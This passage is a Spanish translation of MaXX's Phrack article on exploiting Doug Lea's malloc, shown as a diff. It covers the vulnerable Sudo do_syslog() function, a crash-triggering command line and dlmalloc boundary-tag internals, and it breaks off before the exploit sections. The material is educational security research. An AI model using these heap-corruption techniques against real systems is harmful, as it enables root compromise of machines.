@@ -1,0 +1,2983 @@
+                             ==Phrack Inc.==
+
+             Volumen 0x0b, Numero 0x39, Archivo #0x08 de 0x12
+
+--=[ Disclaimer ]=---------------------------------------------------------//
+
+En este numero de Phrack, hay dos articulos similares acerca de tecnicas de
+explotacion basadas en malloc. La primera explica en detalle la
+implementacion de la Libreria GNU C de la interface malloc y como puede ser
+abusada para explotar buffer overflows en espacio malloc. El segundo articulo
+es un acercamiento mas manos-a-la-obra para introducirte en la idea de los
+overflows malloc. Cubre la implementacion en System V y la implementacion de
+la Libreria GNU C. Si no estas seguro sobre el tema, puede ser una mejor
+eleccion empezar con ello para tener una idea del asunto. Sin embargo, si
+de veras quieres aprender esta tecnica, no hay modo sobre el articulo por MaXX.
+
+--=[ Disfruta ]=-----------------------------------------------------------//
+
+
+|=[ Vudu - Un objeto supersticiosamente creido de tener poderes magicos ]=-|
+|=------------------------------------------------------------------------=|
+|=------------=[ Michel "MaXX" Kaempf <maxx@synnergy.net> ]=--------------=|
+|=---------------[ Copyright (C) 2001 Synnergy Networks ]=----------------=|
+
+
+El presente texto podria probablemente ser titulado "Rompiendo el heap
+para Diversion Y Beneficio"... efectivamente, el asignador de memoria usado
+por la Libreria GNU C (Malloc de Doug Lea) y las tecnicas de corrupcion
+de heap asociadas son presentadas. Sin emargo, fue titulado "Vudu -
+Un objeto supersticiosamente creido de tener poderes magicos" ya que son
+presentados tambien una vulnerabilidad Sudo reciente y el exploit Vudu
+asociado.
+
+--[ Contenidos ]--------------------------------------------------------
+
+1 - Introduccion
+
+2 - El "potencial problema de seguridad"
+  2.1 - Un problema real
+    2.1.1 - La funcion vulnerable
+    2.1.2 - La violacion de segmentacion
+  2.2 - Un exploit irreal
+  2.3 - Corrompiendo el heap
+  2.4 - Conclusion temporaria
+
+3 - Malloc de Doug Lea
+  3.1 - Un asignador de memoria
+    3.1.1 - Metas
+    3.1.2 - Algoritmos
+      3.1.2.1 - Tags limite
+      3.1.2.2 - Binning
+      3.1.2.3 - Preservacion de localidad
+      3.1.2.4 - Preservacion de salvajismo
+      3.1.2.5 - Mapeo de memoria
+  3.2 - Trozos de memoria
+    3.2.1 - Sinopsis de rutinas publicas
+    3.2.2 - Estadisticas vitales
+    3.2.3 - Trozos disponibles
+  3.3 - Tags limite
+    3.3.1 - Estructura
+    3.3.2 - Tama~o de un trozo
+    3.3.3 - campo prev_size
+    3.3.4 - campo de tama~o
+  3.4 - Bins
+    3.4.1 - Indexando en bins
+    3.4.2 - Linkeando trozos en listas de bin
+  3.5 - Principales rutinas publicas
+    3.5.1 - El algoritmo malloc(3)
+    3.5.2 - El algoritmo free(3)
+    3.5.3 - El algoritmo realloc(3)
+  3.6 - Ejecucion de codigo arbitrario
+    3.6.1 - La tecnica unlink()
+      3.6.1.1 - Concepto
+      3.6.1.2 - Prueba de concepto
+    3.6.2 - La tecnica frontlink()
+      3.6.2.1 - Concepto
+      3.6.2.2 - Prueba de concepto
+
+4 - Explotando la vulnerabilidad Sudo
+  4.1 - La teoria
+  4.2 - La practica
+
+5 - Agradecimientos
+
+6 - Outroduccion
+
+
+--[ 1 - Introduccion ]--------------------------------------------------
+
+Sudo (superuser do) permite a un administrador de sistema dar a ciertos
+usuarios (o grupos de usuarios) la habilidad de correr algunos comandos
+(o todos) como root u otro usuario mientras se esta logueando los comandos
+y argumentos.
+-- http://www.courtesan.com/sudo/index.html
+
+El 19 de Febrero de 2001, la version 1.6.3p6 de Sudo fue desarrollada:
+"Esto arregla un potencial problema de seguridad. El bug ya no parece
+ser explotable." A pesar de los comentarios enviados a varias listas de
+correo de seguridad despues del anuncio de la nueva version de Sudo, el bug
+no es un buffer overflow y no da~a la pila.
+
+Pero el bug es explotable: incluso un solo byte ubicado en algun lugar en
+el heap, sobreescrito erroneamente por un byte NUL antes de una llamada
+a syslog(3) e inmediatamente restaurado despues de la llamada syslog(3),
+puede realmente llevar a ejecucion de codigo arbitrario como root. Sacate
+los zapatos, pon tus pies arriba, recuestate y disfruta el... voodoo.
+
+El presente texto se focaliza en sistemas Linux/Intel y:
+
+- detalla el antes mencionado bug y explica por que es necesario un preciso
+conocimiento de como funciona malloc internamente para poder explotarlo;
+
+- describe el funcionamiento del asignador de memoria usado por la Libreria
+GNU C (Malloc de Doug Lea), desde el punto de vista del atacante;
+
+- aplica esta informacion al bug de Sudo, y presenta un exploit que funciona
+para Red Hat Linux/Intel 6.2 (Zoot) sudo-1.6.1-1.
+
+
+--[ 2 - El "potencial problema de seguridad" ]--------------------------
+
+----[ 2.1 - Un problema real ]------------------------------------------
+
+------[ 2.1.1 - La funcion vulnerable ]---------------------------------
+
+La funcion vulnerable, do_syslog(), puede ser encontrada en el archivo
+logging.c del tarball de Sudo. Es llamada por otras dos funciones,
+log_auth() y log_error(), para que syslog permita/denegue y mensajes de
+error. Si el mensaje es mas largo que MAXSYSLOGLEN (960) caracteres,
+do_syslog() lo divide en dos partes, quebrando la linea en la que
+calzara sobre una linea de syslog (como maximo MAXSYSLOGEN caracteres)
+y tratando de quebrar en un limite de palabras si es posible (aqui las
+palabras estan delimitadas por caracteres ESPACIO).
+
+/*
+ * Loguea un mensaje a syslog, agregando el username y dividiendo el
+ * mensaje en partes si es mas largo que MAXSYSLOGLEN.
+ */
+static void do_syslog( int pri, char * msg )
+{
+    int count;
+    char * p;
+    char * tmp;
+    char save;
+
+    /*
+     * Loguea la linea completa, rompiendo en multiples llamadas syslog(3)
+     * si es necesario
+     */
+[1] for ( p=msg, count=0; count < strlen(msg)/MAXSYSLOGLEN + 1; count++ ) {
+[2]     if ( strlen(p) > MAXSYSLOGLEN ) {
+            /*
+             * Rompe la linea en lo que calzara en la linea syslog(3)
+             * Tratar de romper en una palabra limite si es posible.
+             */
+[3]         for ( tmp = p + MAXSYSLOGLEN; tmp > p && *tmp != ' '; tmp-- )
+                ;
+            if ( tmp <= p )
+[4]             tmp = p + MAXSYSLOGLEN;
+
+            /* Linea terminada en NULL, pero guardar el char para 
+	       restaurar luego */
+            save = *tmp;
+[5]         *tmp = '\0';
+
+            if ( count == 0 )
+                SYSLOG( pri, "%8.8s : %s", user_name, p );
+            else
+                SYSLOG( pri,"%8.8s : (command continued) %s",user_name,p );
+
+            /* restaurar caracter guardado */
+[6]         *tmp = save;
+
+            /* Eliminar espacio en blanco de cabecera */
+[7]         for ( p = tmp; *p != ' '; p++ )
+                ;
+[8]     } else {
+            if ( count == 0 )
+                SYSLOG( pri, "%8.8s : %s", user_name, p );
+            else
+                SYSLOG( pri,"%8.8s : (command continued) %s",user_name,p );
+        }
+    }
+}
+
+------[ 2.1.2 - La violacion de segmentacion ]--------------------------
+
+Chris Wilson descubrio que argumentos largos en la linea de comandos
+hacen que Sudo se cuelgue durante la operacion do_syslog():
+
+$ /usr/bin/sudo /bin/false `/usr/bin/perl -e 'print "A" x 31337'`
+Password:
+maxx is not in the sudoers file.  This incident will be reported.
+Segmentation fault
+
+Efectivamente, el loop[7] no chequea por caracteres nulos y por lo
+tanto pushea p hasta el final del mensaje string terminado en
+caracter NUL (creado por log_auth() o log_error() via easprintf(),
+un wrapper para vasprintf(3)). Cuando p alcanza el final del heap
+(msg si por supuesto ubicado en el heap ya que vasprintf(3) depende
+de malloc(3) y realloc(3) para asignar memoria dinamica) Sudo
+eventualmente muere en line[7] con una violacion de segmentacion despues
+de una operacion de lectura fuera de destino.
+
+Esa segmentation fault ocurre solo cuando son pasados argumentos largos
+en la linea de comandos a Sudo porque el loop[7] tiene que ser ejecutado
+varias veces para alcanzar el final del heap (podrian efectivamente
+ser caracteres ESPACIO que fuerzan a do_syslog() a dejar el loop[7],
+despues del final del buffer del mensaje pero antes del final del heap).
+Consecuentemente, el largo del string del msg tiene que ser varias veces
+MAXSYSLOGLEN porque el loop[1] corre tan largo como el conteo no alcance
+(strlen(msg)/MAXSYSLOGLEN + 1).
+
+----[ 2.2 - Un exploit irreal ]-----------------------------------------
+
+Muriendo despues de una operacion de lectura ilegal es una cosa, poder
+llevar a cabo una operacion de escritura ilegal para ganar privilegios
+de root es otra. Desafortunadamente do_syslog() altera el heap en dos
+lugares solamente: line[5] y line[6]. Si do_syslog() sobreescribe
+erroneamente un caracter en line[5], tiene que ser explotado durante una
+de las llamadas syslog(3) entre line[5] y line[6], porque el caracter
+erroneamente sobreescrito es inmediatamente restaurado en line[6].
+
+Ya que msg fue asignado en el heap via malloc(3) y realloc(3), hay
+una estructura interesante guardada justo despues del final del buffer
+del msg, mantenida internamente por malloc: un tan-nombrado tag limite.
+Si syslog(3) usa una de las funciones malloc (calloc(3), malloc(3), free(3)
+o realloc(3) y si el exploit Sudo corrompe ese tag limite durante la
+ejecucion de do_syslog(), puedan pasar cosas malignas. Pero syslog(3)
+llama a funciones malloc realmente?
+
+$ /usr/bin/sudo /bin/false `/usr/bin/perl -e 'print "A" x 1337'`
+[...]
+malloc( 100 ): 0x08068120;
+malloc( 300 ): 0x08060de0;
+free( 0x08068120 );
+malloc( 700 ): 0x08060f10;
+free( 0x08060de0 );
+malloc( 1500 ): 0x080623b0;
+free( 0x08060f10 );
+realloc( 0x080623b0, 1420 ): 0x080623b0;
+[...]
+malloc( 192 ): 0x08062940;
+malloc( 8192 ): 0x080681c8;
+realloc( 0x080681c8, 119 ): 0x080681c8;
+free( 0x08062940 );
+free( 0x080681c8 );
+[...]
+
+Las primeras series de llamadas malloc fueron llevadas a cabo por log_auth()
+para asignar memoria para el buffer del msg, pero las segundas series de
+llamadas malloc fueron llevadas a cabo... por syslog(3). Quizas el exploit
+Sudo no estan irreal despues de todo.
+
+----[ 2.3 - Corrompiendo el heap ]---------------------------------------
+
+Sin embargo, es realmente posible alterar un byte dado del tag limite
+ubicado despues del buffer del msg (o mas generalmente para sobreescribir
+en line[5] un caracter arbitrario (despues del final del msg) con un byte
+NUL)? Si el exploit Sudo depende exclusivamente del contenido del buffer
+del msg (que esta afortunadamente compuesto de varios strings dados por
+el usuario (directorio actual de trabajo, comando sudo, y demas)), la
+respuesta es no. Esta afirmacion es demostrada a continuacion.
+
+El caracter sobreescrito en line[5] por un byte NUL esta apuntando a tmp:
+
+- tmp viene de loop[3] si hay un caracter ESPACIO entre los primeros
+MAXSYSLOGLEN bytes despues de p. tmp entonces apunta al primer caracter
+ESPACIO encontrado cuando loopeo de (p + MAXSYSLOGLEN) hacia p.
+
+-- Si el caracter ESPACIO sobreescrito esta ubicado dentro del buffer del
+mensaje, no hay corrupcion de heap del todo porque la operacion de
+escritura no es una ilegal.
+
+-- Si el caracter ESPACIO encontrado primero es ubicado fuera del buffer
+del msg, el exploit Sudo no puede controlar su posicion exacta si solamente
+depende del contenido del buffer del msg, y de esta manera no puede
+controlar donde es escrito el byte NUL.
+
+- tmp viene de line[4] si no hay un caracter ESPACIO entre los primeros
+MAXSYSLOGLEN bytes despues de p. tmp es entonces igual a (p + MAXSYSLOGLEN).
+
+-- Si p y tmp son ambos ubicados dentro del buffer del msg, no hay corrupcion
+de memoria posible, porque sobreescribir el caracter tmp ubicado dentro
+de un buffer devuelto por malloc es una accion perfectamente legal.
+
+-- Si p es ubicado dentro del buffer del msg y tmp es ubicado afuera del
+buffer del msg... esto es imposible porque el terminador NUL al final del
+buffer del msg, ubicado entre p y tmp, previene a do_syslog() de pasar
+exitosamente el test[2] (y el codigo en line[8] no es interesante porque
+no lleva a cabo operacion de escritura).
+
+Ademas, si test[2] falla una vez fallara siempre, porque p nunca sera
+modificado de nuevo y strlen(p) se quedara por lo tanto en menos o igual
+a MAXSYSLOGLEN, forzando a do_syslog() a ejecutar el codigo en line[8]
+de nuevo y de nuevo, tanto como el contador no alcance
+(strlen(msg)/MAXSYSLOGLEN + 1).
+
+-- Si p y tmp son ambos ubicados afuera del buffer del msg, p apunta al
+primer caracter ESPACIO encontrado despues del final del string del msg
+porque fue pusheado afuera del buffer del msg por el loop[7]. Si el
+exploit Sudo depende exclusivamente del contenido del buffer del msg,
+no puede controlar a p porque no puede controlar la ocurrencia de
+caracteres ESPACIO despues del final del string del msg. Consecuentemente,
+no puede controlar a tmp, que apunta al lugar donde esta escrito el byte
+NUL, porque tmp depende de p.
+
+Ademas, despues de que p fue pusheado fuera del buffer del msg por el
+loop[7], no deberia haber caracter NUL entre p y (p + MAXSYSLOGLEN)
+para pasar el test[2] exitosamente. El exploit Sudo deberia una vez mas
+depender del contenido de la memoria despues del msg.
+
+----[ 2.4 - Conclusion temporaria ]-------------------------------------
+
+El exploit Sudo deberia o debe:
+
+- sobreescribir un byte del tag limite ubicado despues del buffer del msg
+con el byte NUL... deberia por consiguiente controlar el contenido de la
+memoria despues del msg (manejado por malloc) porque, como fue probado en
+2.3, el control del buffer del msg en si mismo no es suficiente;
+
+- tomar ventaja del byte erroneamente sobreescrito antes de ser restaurado...
+una de las llamadas malloc llevada a cabo por syslog(3) deberia por lo tanto
+leer el tag limite corrompido y mas adelante alterar la ejecucion usual
+de Sudo.
+
+Pero para poder llevar a cabo estas tareas, es necesario un conocimiento
+profundo sobre como funciona internamente malloc.
+
+
+--[ 3 - Malloc de Doug Lea ]---------------------------------------------
+
+El Malloc de Doug Lea (o mas corto, dlmalloc) es el asignador de memoria
+usado por la Libreria GNU C (disponible en el directorio malloc del arbol
+fuente de la libreria). Maneja el heap y por lo tanto provee las funciones
+calloc(3), malloc(3), free(3) y funciones realloc(3) que asignan y liberan
+memoria dinamica.
+
+La descripcion a continuacion se focaliza en los aspectos de dlmalloc
+necesitados para corromper el heap exitosamente y subsecuentemente
+explotar una de las llamadas malloc para ejecutar codigo arbitrario.
+Un descripcion mas completa esta disponible en el arbol fuente de la
+Libreria GNU C y en las siguientes direcciones:
+
+ftp://gee.cs.oswego.edu/pub/misc/malloc.c
+http://gee.cs.oswego.edu/dl/html/malloc.html
+
+----[ 3.1 - Un asignador de memoria ]-----------------------------------
+
+"Este no es el mas rapido, mas conservador de espacio, mas portable,
+o mas afinable malloc jamas escrito. Sin embargo esta entre los mas
+rapidos mientras tambien esta entre los mas conservadores de espacio,
+portables y afinados. El consistente balance a traves de estos factores
+resultan en un buen asignador de proposito general para programas
+intensivos con malloc."
+
+------[ 3.1.1 - Metas ]-------------------------------------------------
+
+Las principales metas de dise~o para este asignador estan maximizando
+compatibilidad, maximizando portabilidad, minimizando espacio,
+minimizando tiempo, maximizando afinamiento, maximizando localizacion,
+maximizando deteccion de errores, minimizando anomalias. Alguna de estas
+metas de dise~o son criticas cuando viene a da~ar el heap y explotando
+llamadas malloc despues:
+
+- Maximizando portabilidad: "conformidad para todas las molestias
+conocidas de los sistemas en reglas de alineamiento y direccionamiento."
+Como fue detallado en 3.2.2 y 3.3.2, el alineamiento de 8 bytes esta
+actualmente hardwired dentro del dise~o de dlmalloc. Esta es una de las
+principales caracteristicas para tener en mente permanentemente.
+
+- Minimizando espacio: "El asignador [...] deberia mantener memoria de
+formas que minimicen fragmentacion -- agujeros en trozos contiguos de
+memoria que no son usados por el programa." Pero los agujeros son a veces
+necesitados para atacar programas exitosamente que corrompen el heap
+(Sudo por ejemplo).
+
+- Maximizando afinamiento: "Caracteristicas y comportamiento opcional
+deberian ser controlables por usuarios". Las variables de entorno como
+MALLOC_TOP_PAD_ alteran el funcionamiento de dlmalloc y pueden por
+lo tanto ayudar en explotacion de llamadas malloc. Desafortunadamente
+no son cargadas cuando un programa SUID o SGID esta corriendo.
+
+- Maximizando localizacion: "Asignando trozos de memoria que son
+tipicamente usados juntos uno cerca del otro." El exploit Sudo por
+ejemplo depende mucho de esta caracteristica para crear correctamente
+agujeros en memoria manejados por dlmalloc.
+
+- Maximizando deteccion de error: "los asignadores deberian proveer
+algunas cosas para detectar corrupcion debido a sobreescritura de memoria,
+multiples frees y demas." Afortunadamente para el atacante que rompe el
+heap para ejecutar codigo arbitrario, la Libreria GNU C no activa estos
+mecanismos de deteccion de error (la opcion en tiempo de compilacion
+MALLOC_DEBUG y los pirateos de debuggeo malloc (__malloc_hook, __free_hook,
+etc)) por defecto.
+
+------[ 3.1.2 - Algoritmos ]--------------------------------------------
+
+"Mientras se esta uniendo via tags limite y calzando de la mejor manera via
+binning representa las principales ideas del algoritmo, las consideraciones
+mas adelante llevan a un numero de mejoras heuristicas. Ellas incluyen
+preservacion de localizacion, preservacion de salvajismo, mapeo de memoria".
+
+--------[ 3.1.2.1 - Tags limite ]---------------------------------------
+
+Los trozos de memoria manejados por el Malloc de Doug Lea "contienen sus
+campos de informacion de tama~o antes y despues del trozo. Esto permite
+dos importantes capacidades:
+
+- Dos trozos sin usar bordeando pueden ser unidos en un trozo largo.
+Esto minimiza el numero de peque~os trozos sin uso.
+
+- Todos los trozos pueden ser atravesados desde cualquier trozo conocido
+en una direccion hacia adelante o hacia atras."
+
+La presencia de tal tag limite (la estructura manteniendo dichos campos
+de informacion, detallados en 3.3) entre cada trozo de memoria viene
+como un regalo del cielo para el atacante que trata de explotar el mal
+manejo del heap. Efectivamente, los tags limite son estructuras de control
+ubicadas en la mitad de un area de memoria potencialmente corrompible
+(el heap), y si el atacante tiene el poder para trucar dlmalloc para que
+procese un tag limite falso (o alterado) cuidadosamente dise~ado,
+podrian eventualmente ejecutar codigo arbitrario.
+
+Por ejemplo, el atacante puede overflowear un buffer dinamicamente asignado
+por malloc(3) y sobreescribir el siguiente tag limite continuo (exploit
+de los navegadores Netscape), o underflowear tal buffer y sobreescribir el
+tag limite guardado justo antes (exploit Secure Locate), o hacer que el
+programa vulnerable lleve a cabo una llamada free(3) incorrecta (exploit
+LBNL traceroute) o multiples frees, o sobreescribir un byte solo de un
+tag limite con un byte NUL (exploit Sudo), y demases:
+
+http://www.openwall.com/advisories/OW-002-netscape-jpeg.txt
+
+ftp://maxx.via.ecp.fr/dislocate/
+
+http://www.synnergy.net/downloads/exploits/traceroute-exp.txt
+ftp://maxx.via.ecp.fr/traceroot/
+
+--------[ 3.1.2.2 - Binning ]-------------------------------------------
+
+"Los trozos disponibles son mantenidos en bins, agrupados por tama~o."
+Dependiendo en su tama~o, un trozo libre es guardado por dlmalloc en el
+bin correspondiendo al rango de tama~o correcto (los bins son detallados
+en 3.4):
+
+- si el tama~o del trozo es 200 bytes por ejemplo, es guardado en el bin
+que mantiene los trozos libres cuyo tama~o es exactamente 200 bytes;
+
+- si el tama~o del trozo es 1504 bytes, es guardado en el bin que mantiene
+los trozos libres cuyo tama~o es mayor o igual a 1472 bytes pero menor que
+1536;
+
+- si el tama~o del trozo es 16392 bytes, es guardado en el bin que mantiene
+los trozos libres cuyo tama~o es mayor que o igual a 16384 bytes pero menor
+que 20480;
+
+- y demas (como estos rangos son computados y como es elegido el bin correcto
+es detallado en 3.4.1).
+
+"Busquedas por trozos disponibles son procesadas en orden peque~as-primero,
+mejor-calce. [...] Hasta las versiones desarrolladas en 1995, los trozos
+fueron dejados sin ordenar dentro de bins, por lo que la estrategia
+mejor-calce fue solo aproximada. Las versiones mas recientes en su lugar
+ordenan trozos por tama~o dentro de bins, con ataduras rotas por un regla
+antiguos-primero."
+
+Estos algoritmos son implementados via la funcion chunk_alloc() (llamada
+por malloc(3) por ejemplo) y la macro frontlink(), detallada en 3.5.1 y
+3.4.2.
+
+--------[ 3.1.2.3 - Preservacion de Localizacion ]----------------------
+
+"En la version actual de malloc, una version de siguiente-calce es usada
+solo en un contexto restringido que mantiene localizacion en esos casos
+donde hay conflictos al menos con otras metas: Si un trozo del tama~o
+deseado exacto no esta disponible, el mas reciente espacio fuera-de-split
+es usado (y re-unido) si es lo suficientemente grande; de otro modo es
+usado mejor-calce."
+
+Esta caracteristica, implementada dentro de la funcion chunk_alloc(),
+prueba ser escencial para el exploit Sudo. Gracias a ella, el exploit
+puede canalizar unas completas series de llamadas malloc(3) con un
+area de memoria particular libre, y puede por consiguiente proteger
+otra area de memoria libre que tuvo que permanecer intocable (y de otro
+modo podria haber sido asignada durante el paso mejor-calce del algoritmo
+malloc).
+
+--------[ 3.1.2.4 - Preservacion de salvajismo ]------------------------
+
+"El trozo (tan nombrado por Kiem-Phong Vo) salvaje representa el espacio
+bordeando la direccion mas alta asignada desde el sistema. Porque esta
+en el borde, es el unico trozo que puede ser extendido arbitrariamente
+(via sbrk en Unix) para ser mas grande de lo que es (a no ser por
+supuesto que sbrk falle porque toda la memoria ha estado exhausta).
+
+Una manera de lidiar con el trozo salvaje es manejarlo del mismo modo
+que cualquier otro trozo. [...] Una mejor estrategia es actualmente
+usada: tratar de hacer al trozo salvaje tan grande como los otros,
+ya que puede ser hecho asi (sobre las limitaciones del sistema) y usarlo
+como en un scan de mejores-primero. Esto resulta en que el trozo salvaje
+siempre es usado solo si no existe ningun otro trozo, para evitar
+fragmentacion preventiva mas adelante."
+
+El trozo salvaje es uno de los oponentes mas peligrosos del atacante que
+trata de explotar el mal manejo del heap. Porque este trozo de memoria
+es manejado especialmente por las rutinas internas de la dlmalloc (como
+esta detallado en 3.5), el atacante raramente podra ejecutar codigo
+arbitrario si corrompen solamente el tag limite asociado con el trozo
+salvaje.
+
+--------[ 3.1.2.5 - Mapeo de memoria ]----------------------------------
+
+"En adicion en asignacion de regiones extendidas de proposito general
+via sbrk, la mayoria de las versiones de Unix soportan system calls como
+mmap que asigna una region separada no-contigua de memoria para uso por
+un programa. Esto provee una segunda opcion con malloc para satisfacer
+una solicitud de memoria. [...] la actual version de malloc depende de
+mmap solo si (1) la solicitud es mayor que (dinamicamente ajustable) el
+tama~o threshold (actualmente por defecto 1MB) y (2) el espacio
+solicitado no esta ya disponible en el lugar existente para que pueda
+ser obtenida via sbrk."
+
+Por estas dos razones, y porque las variables de entorno que alteran
+el comportamiento del mecanismo de mapeo de memoria (MALLOC_MMAP_THRESHOLD_
+y MALLOC_MMAP_MAX_) no son cargadas cuando un programa SUID o SGID es
+ejecutado, no es necesario un conocimiento perfecto de como funciona la
+caracteristica de mapeo de memoria cuando se estan abusando llamadas malloc.
+Sin embargo, sera discutido brevemente en 3.3.4 y 3.5.
+
+----[ 3.2 - Trozos de memoria ]------------------------------------------
+
+El heap esta dividido por Malloc de Doug Lea en trozos de memoria contiguos.
+La disposicion del heap evoluciona cuando las funciones malloc son llamadas
+(los trozos pueden ser ubicados, liberados, divididos, unidos) pero todos
+los procedimientos mantienen la invariante de que ningun trozo bordea
+fisicamente a otro (dos trozos bordeandose y sin usar son siempre unidos
+en un trozo mas largo).
+
+------[ 3.2.1 - Sinopsis de rutinas publicas ]--------------------------
+
+Los trozos de memoria manejados por dlmalloc son asignados y liberados via
+cuatro rutinas publicas principales:
+
+- "malloc(size_t n); Devuelve un puntero a un trozo asignado recientemente
+de al menos n bytes, o null si no hay espacio disponible."
+
+La rutina malloc(3) depende de la funcion interna chunk_alloc() mencionada
+en 3.1.2 y detallada en 3.5.1.
+
+- "free(Void_t* p); Desarrolla el trozo de memoria apuntado a por p, o no
+hay efecto si p es null."
+
+La rutina free(3) depende de la funcion interna chunk_free() presentada en
+3.5.2.
+
+- "realloc(Void_t* p, size_t n); Devuelve un puntero a un trozo de tama~o n
+que contiene los mismos datos como lo hace el trozo p arriba del minimo de
+(n, el tama~o de p) bytes, o null si no hay espacio disponible. El puntero
+devuelto puede o no ser el mismo que p. Si p es null, es equivalente a
+malloc. A no ser que #define REALLOC_ZERO_BYTES_FREES a continuacion sea
+configurado, realloc con un tama~o de argumento de cero (re)asigna un
+trozo reducido al minimo."
+
+realloc(3) llama a la funcion interna chunk_realloc() (detallada en 3.5.3)
+que una vez mas depende de chunk_alloc() y chunk_free(). Como una nota
+al costado, la Libreria GNU C define REALLOC_ZERO_BYTES_FREES, por lo que
+realloc con un tama~o de argumento de cero libera el trozo p asignado.
+
+- "calloc(size_t unit, size_t quantity); Devuelve un puntero para cantidad *
+bytes de unidad, con todas las locaciones puestas a cero."
+
+calloc(3) se comporta como malloc(3) (llama a chunk_alloc() en la misma
+manera) excepto que calloc(3) saca los puestos a cero del trozo asignado
+antes de que sea devuelto al usuario. calloc(3) por lo tanto no es
+discutido en este texto.
+
+------[ 3.2.2 - Estadisticas vitales ]----------------------------------
+
+Cuando un usuario llama a dlmalloc para asignar memoria dinamica, el
+tama~o efectivo del trozo asignado (el numero de bytes realmente aislados
+en el heap) no es nunca igual al tama~o solicitado por el usuario.
+Este sobrepaso es el resultado de la presencia de tags limite antes y
+despues del buffer devuelto al usuario, y el resultado del alineamiento
+de 8 bytes mencionado en 3.1.1.
+
+- Alineamiento:
+
+Ya que el tama~o de un trozo es siempre un multiplo de 8 bytes (como el
+tama~o efectivo de un trozo es computado esta detallado en 3.3.2) y ya que
+el primer trozo en el heap esta alineado a 8 bytes, los trozos de memoria
+devueltos al usuario (y los tags limite asociados) son siempre alineados
+en direcciones que son multiplos de 8 bytes.
+
+- Minimo sobrepaso por trozo asignado:
+
+Cada trozo asignado tiene un sobrepaso escondido de (al menos) 4 bytes.
+El entero compuesto de estos 4 bytes, un campo del tag limite asociado
+con cada trozo, mantiene la informacion de tama~o y estado, y es detallado
+en 3.3.4.
+
+- Tama~o minimo asignado:
+
+Cuando malloc(3) es llamada con un tama~o de argumento de cero, Malloc de
+Doug Lea realmente asigna 16 bytes en el heap (el tama~o minimo asignado,
+el tama~o de un tag limite).
+
+------[ 3.2.3 - Trozos disponibles ]-------------------------------------
+
+Los trozos disponibles son matenidos en cualquiera de los varios lugares
+(todos declarados a continuacion):
+
+- los bins (mencionados en 3.1.2.2 y detallados en 3.4) mantienen
+exclusivamente trozos de memoria libre;
+
+- el trozo disponible en lo mas alto (el trozo salvaje presentado en 3.1.2.4)
+esta siempre libre y nunca incluye ningun bin;
+
+- el resto del trozo mas recientemente dividido (no en el tope) esta siempre
+libre y nunca incluye ningun bin.
+
+----[ 3.3 - Tags limite ]-----------------------------------------------
+
+------[ 3.3.1 - Estructura ]--------------------------------------------
+
+#define INTERNAL_SIZE_T size_t
+
+struct malloc_chunk {
+    INTERNAL_SIZE_T prev_size;
+    INTERNAL_SIZE_T size;
+    struct malloc_chunk * fd;
+    struct malloc_chunk * bk;
+};
+
+Esta estructura, guardada en frente de cada trozo de memoria manejado por
+Malloc de Doug Lea, es una representacion de los tags limite presentados en
+3.1.2.1. El modo en que son usados sus campos depende en que el trozo
+asociado este disponible o no, y que el trozo previo este libre o no.
+
+- Un trozo asignado se ve asi:
+
+    chunk -> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+             | prev_size: tama~o del trozo previo, en bytes (usado     |
+             | por dlmalloc solo si este trozo previo esta libre)      |
+             +---------------------------------------------------------+
+             | size: tama~o del trozo (el numero de bytes entre        |
+             | "chunk" y "nextchunk") y 2 bits de informacion de estado|
+      mem -> +---------------------------------------------------------+
+             | fd: no usado por dlmalloc porque "chunk" esta asignado  |
+             | (los datos del usuario por lo tanto comienzan aqui)     |
+             + - - - - - - - - - - - - - - - - - - - - - - - - - - - - +
+             | bk: no usado por dlmalloc porque "chunk" esta asignado  |
+             | (puede haber datos del usuario aqui)                    |
+             + - - - - - - - - - - - - - - - - - - - - - - - - - - - - +
+             |                                                         .
+             .                                                         .
+             . datos del usuario (puede ser 0 bytes de largo)          .
+             .                                                         .
+             .                                                         |
+nextchunk -> + + + + + + + + + + + + + + + + + + + + + + + + + + + + + +
+             | prev_size: no usado por dlmalloc porque "chunk" esta    |
+             | asignado (puede mantener datos de usuario, para         |
+             | decrementar perdidas)                                   |
+             +---------------------------------------------------------+
+
+"chunk" es el frente del trozo (y por lo tanto el frente del tag limite
+asociado) para el proposito de la mayoria del codigo de dlmalloc,
+"nextchunk" es el principio del siguiente trozo contiguo, y "mem" es el
+puntero que le es devuelto al usuario (por malloc(3) o realloc(3) por
+ejemplo).
+
+La conversion de cabeceras malloc ("chunk") a punteros de usuario ("mem"),
+y al reves, es llevada a cabo por dos macros, chunk2mem() y mem2chunk().
+Simplemente suman o restan 8 bytes (el tama~o del prev_size y campos de
+tama~o que separan "mem" de "chunk"):
+
+#define Void_t void
+#define SIZE_SZ sizeof(INTERNAL_SIZE_T)
+typedef struct malloc_chunk * mchunkptr;
+
+#define chunk2mem( p ) \
+    ( (Void_t *)((char *)(p) + 2*SIZE_SZ) )
+
+#define mem2chunk( mem ) \
+    ( (mchunkptr)((char *)(mem) - 2*SIZE_SZ) )
+
+Aunque un usuario nunca deberia utilizar mas bytes de los que son solicitados,
+el numero de bytes reservados para el usuario por Malloc de Doug Lea puede
+ser realmente mayor que la cantidad de memoria dinamica solicitada (debido
+al alineamiento de 8 bytes). En realidad, el area de memoria donde el usuario
+puede guardar datos sin corromper el heap empieza en "mem" y termina en
+(pero incluye) el campo prev_size de "nextchunk" (efectivamente, este campo
+prev_size no es usado por dlmalloc (ya que "chunk" esta asignado) y puede
+por consiguiente mantener datos de usuario, para decrementar perdidas),
+y es por lo tanto (("nextchunk" + 4) - "mem") bytes de largo (los 4 bytes
+adicionales corresponden al tama~o de este campo trepador prev_size).
+
+Pero el tama~o de este area de memoria, (("nextchunk" + 4) - "mem"), es
+tambien igual a (("nextchunk" + 4) - ("chunk" + 8)), que es por supuesto
+igual a (("nextchunk" - "chunk") - 4). Ya que ("nextchunk" - "chunk") es
+el tama~o efectivo de "chunk", el tama~o del area de memoria donde el
+usuario puede guardar datos sin corromper el heap es igual al tama~o
+efectivo del trozo menos 4 bytes.
+
+- Los trozos liberados son guardados en listas circulares doblemente
+linkeadas (descriptas en 3.4.2) y se ven asi:
+
+    chunk -> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+             | prev_size: puede mantener datos de usuario (en efecto,  |
+             | ya que "chunk" esta libre el trozo previo es            |
+             | necesariamente asignado)                                |
+             +---------------------------------------------------------+
+             | size: tama~o del trozo (el numero de bytes entre        |
